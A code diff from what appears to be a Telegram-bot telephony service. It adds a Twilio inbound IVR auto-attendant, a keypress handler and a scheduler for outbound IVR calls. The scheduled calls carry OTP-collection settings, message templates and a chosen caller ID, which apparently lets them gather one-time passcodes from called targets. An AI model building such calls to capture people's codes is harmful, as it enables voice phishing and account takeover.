   if (action === a.audioLibMenu) {
     if (message === '↩️ Back' || message === t.back) return goto.submenu5()
     if (message === '📎 Upload Audio') {
@@ -24970,6 +25312,36 @@ app.post('/twilio/voice-webhook', async (req, res) => {
       }
     }
 
+    // ━━━ PRIORITY 0: IVR Auto-Attendant (Business plan) ━━━
+    const ivrConfig = num.features?.ivr
+    if (ivrConfig?.enabled && phoneConfig.canAccessFeature(num.plan, 'ivr') && ivrConfig.options && Object.keys(ivrConfig.options).length > 0) {
+      log(`[Twilio] Starting IVR auto-attendant for ${To}`)
+      const ivrGatherUrl = `${SELF_URL}/twilio/inbound-ivr-gather?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`
+      const gather = response.gather({ action: ivrGatherUrl, method: 'POST', numDigits: 1, timeout: 10, finishOnKey: '' })
+      if (ivrConfig.greetingAudioUrl) {
+        gather.play(ivrConfig.greetingAudioUrl)
+      } else if (ivrConfig.greeting) {
+        gather.say(ivrConfig.greeting)
+      } else {
+        gather.say('Thank you for calling. Please listen to the following options.')
+      }
+      // Repeat once for callers who missed it
+      const gather2 = response.gather({ action: ivrGatherUrl, method: 'POST', numDigits: 1, timeout: 8, finishOnKey: '' })
+      gather2.say('Sorry, we did not receive your selection. Please try again.')
+      // No selection — fall to voicemail or hangup
+      if (vmConfig?.enabled) {
+        if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
+          response.play(vmConfig.customAudioGreetingUrl)
+        } else { response.say('No selection received. Please leave a message after the beep.') }
+        response.record({ action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`, maxLength: 120, playBeep: true, timeout: 5 })
+      } else {
+        response.say('No selection received. Goodbye.')
+        response.hangup()
+      }
+      bot?.sendMessage(chatId, `📞 <b>Incoming Call</b>\nFrom: ${phoneConfig.formatPhone(From)} → ${phoneConfig.formatPhone(To)}\n🤖 IVR Auto-Attendant active`, { parse_mode: 'HTML' }).catch(() => {})
+      return res.type('text/xml').send(response.toString())
+    }
+
     // ━━━ PRIORITY 1: Forward-always ━━━
     if (fwdConfig?.enabled && fwdConfig.forwardTo && fwdConfig.mode === 'always') {
       const RATE = parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
@@ -25108,6 +25480,93 @@ app.post('/twilio/voice-webhook', async (req, res) => {
 const _twilioBilledCallSids = new Set()
 // Auto-cleanup: remove stale entries every 30 min (calls older than 2h can't re-trigger)
 setInterval(() => _twilioBilledCallSids.clear(), 30 * 60 * 1000)
+
+// ── Dedup set already declared above ──
+
+// ━━━ Twilio Inbound IVR Gather Result ━━━
+app.post('/twilio/inbound-ivr-gather', async (req, res) => {
+  const VoiceResponse = require('twilio').twiml.VoiceResponse
+  try {
+    const { chatId: rawChatId, from, to } = req.query
+    const chatId = rawChatId ? parseInt(rawChatId) : null
+    const { Digits } = req.body || {}
+    const response = new VoiceResponse()
+    const decodedFrom = decodeURIComponent(from || 'unknown')
+    const decodedTo = decodeURIComponent(to || '')
+
+    log(`[Twilio] IVR gather: chatId=${chatId} digits=${Digits} from=${decodedFrom} to=${decodedTo}`)
+
+    if (!chatId || !Digits) {
+      response.say('Invalid selection. Goodbye.')
+      response.hangup()
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // Look up user's IVR config
+    const allUsers = await db.collection('phoneNumbersOf').find({}).toArray()
+    let num = null
+    for (const user of allUsers) {
+      const numbers = user.val?.numbers || []
+      const match = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
+      if (match && user._id === chatId) { num = match; break }
+    }
+
+    const ivrConfig = num?.features?.ivr || {}
+    const option = ivrConfig.options?.[Digits]
+
+    if (!option) {
+      response.say('Invalid selection. Goodbye.')
+      response.hangup()
+      bot?.sendMessage(chatId, `📞 <b>IVR Call</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n❌ Invalid key pressed: ${Digits}`, { parse_mode: 'HTML' }).catch(() => {})
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // Handle IVR option actions
+    const action = option.action || 'transfer'
+    const label = option.label || `Option ${Digits}`
+
+    if (action === 'transfer' && option.number) {
+      response.say(`Connecting you to ${label}. Please hold.`)
+      const dial = response.dial({ callerId: decodedTo, timeout: 30 })
+      dial.number(option.number)
+      log(`[Twilio] IVR transferring to ${option.number} (key ${Digits}: ${label})`)
+      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n🔗 Transferring to: ${option.number}\n📋 ${label}`, { parse_mode: 'HTML' }).catch(() => {})
+    } else if (action === 'voicemail') {
+      const vmConfig = num?.features?.voicemail || {}
+      if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
+        response.play(vmConfig.customAudioGreetingUrl)
+      } else { response.say(option.message || 'Please leave a message after the beep.') }
+      response.record({
+        action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(decodedFrom)}&to=${encodeURIComponent(decodedTo)}`,
+        maxLength: 120, playBeep: true, timeout: 5,
+      })
+      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label} → Voicemail`, { parse_mode: 'HTML' }).catch(() => {})
+    } else if (action === 'message') {
+      response.say(option.message || 'Thank you for calling. Goodbye.')
+      response.hangup()
+      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label} → Message played`, { parse_mode: 'HTML' }).catch(() => {})
+    } else {
+      response.say('Thank you. Goodbye.')
+      response.hangup()
+      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label}`, { parse_mode: 'HTML' }).catch(() => {})
+    }
+
+    // Log IVR interaction
+    await db.collection('phoneLogs').insertOne({
+      chatId, type: 'ivr_inbound', provider: 'twilio',
+      from: decodedFrom, to: decodedTo, digitPressed: Digits,
+      action, label, timestamp: new Date().toISOString(),
+    })
+
+    res.type('text/xml').send(response.toString())
+  } catch (error) {
+    log('[Twilio] IVR gather error:', error.message)
+    const response = new VoiceResponse()
+    response.say('An error occurred. Goodbye.')
+    response.hangup()
+    res.type('text/xml').send(response.toString())
+  }
+})
 
 app.post('/twilio/sip-ring-result', async (req, res) => {
   const VoiceResponse = require('twilio').twiml.VoiceResponse
@@ -26913,6 +27372,57 @@ const startServer = async () => {
   
   // Set up Telegram webhook
   await setupTelegramWebhook()
+
+  // ── Call Scheduler (#10): Check for due scheduled calls every 30s ──
+  setInterval(async () => {
+    try {
+      const now = new Date()
+      const dueCalls = await db.collection('scheduledCalls').find({
+        status: 'pending',
+        scheduledAt: { $lte: now },
+      }).toArray()
+
+      for (const call of dueCalls) {
+        await db.collection('scheduledCalls').updateOne({ _id: call._id }, { $set: { status: 'executing' } })
+        const chatId = call.chatId
+        const ivrObData = call.ivrObData || {}
+        log(`[Scheduler] Executing scheduled call for chatId=${chatId} to=${ivrObData.targetNumber}`)
+
+        try {
+          const voiceService = require('./voice-service.js')
+          const userData = await get(phoneNumbersOf, chatId)
+          const callerNumber = (userData?.numbers || []).find(n => n.phoneNumber === ivrObData.callerId)
+          const subAccountSid = callerNumber?.twilioSubAccountSid || userData?.twilioSubAccountSid || null
+          const subAccountToken = callerNumber?.twilioSubAccountToken || userData?.twilioSubAccountToken || null
+          const callerProvider = ivrObData.callerProvider || 'telnyx'
+
+          const result = await voiceService.initiateOutboundIvrCall({
+            chatId, callerId: ivrObData.callerId, targetNumber: ivrObData.targetNumber,
+            ivrNumber: ivrObData.ivrNumber, audioUrl: ivrObData.audioUrl,
+            activeKeys: ivrObData.activeKeys, templateName: ivrObData.templateName,
+            placeholderValues: ivrObData.placeholderValues, voiceName: ivrObData.voiceName,
+            isTrial: false, holdMusic: ivrObData.holdMusic || false,
+            provider: callerProvider, twilioSubAccountSid: subAccountSid, twilioSubAccountToken: subAccountToken,
+            ivrMode: ivrObData.ivrMode || 'transfer', otpLength: ivrObData.otpLength || 6,
+            otpMaxAttempts: ivrObData.otpMaxAttempts || 3,
+            otpConfirmMsg: ivrObData.otpConfirmMsg || null, otpRejectMsg: ivrObData.otpRejectMsg || null,
+          })
+
+          if (result.error) {
+            bot?.sendMessage(chatId, `❌ <b>Scheduled Call Failed</b>\n📞 ${ivrObData.targetNumber}\n${result.error}`, { parse_mode: 'HTML' }).catch(() => {})
+            await db.collection('scheduledCalls').updateOne({ _id: call._id }, { $set: { status: 'failed', error: result.error } })
+          } else {
+            bot?.sendMessage(chatId, `🕐 <b>Scheduled Call Placed!</b>\n📞 Calling ${ivrObData.targetNumber} now...`, { parse_mode: 'HTML' }).catch(() => {})
+            await db.collection('scheduledCalls').updateOne({ _id: call._id }, { $set: { status: 'completed' } })
+          }
+        } catch (e) {
+          log(`[Scheduler] Error executing call: ${e.message}`)
+          bot?.sendMessage(chatId, `❌ <b>Scheduled Call Error</b>\n${e.message}`, { parse_mode: 'HTML' }).catch(() => {})
+          await db.collection('scheduledCalls').updateOne({ _id: call._id }, { $set: { status: 'error', error: e.message } })
+        }
+      }
+    } catch (e) { log(`[Scheduler] Check error: ${e.message}`) }
+  }, 30000)
 }
 
 const tryConnectReseller = async () => {
